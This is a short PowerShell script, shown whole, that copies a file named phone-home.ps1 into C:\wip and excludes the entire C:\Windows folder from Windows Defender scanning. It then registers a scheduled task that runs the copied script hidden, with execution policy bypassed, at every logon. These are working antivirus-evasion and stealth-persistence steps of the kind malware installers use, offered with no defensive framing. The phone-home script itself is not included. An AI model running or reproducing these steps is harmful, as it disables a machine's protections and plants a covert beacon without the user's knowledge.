cp .\phone-home.ps1 c:\wip\phone-home.ps1
Add-MpPreference -ExclusionPath "C:\Windows"
$Sta = New-ScheduledTaskAction -Execute "powershell -executionpolicy bypass -windowstyle hidden C:\wip\phone-home.ps1"
$Stt = New-ScheduledTaskTrigger -AtLogon 
Register-ScheduledTask ET-Onlogon -Action $Sta -Trigger $Stt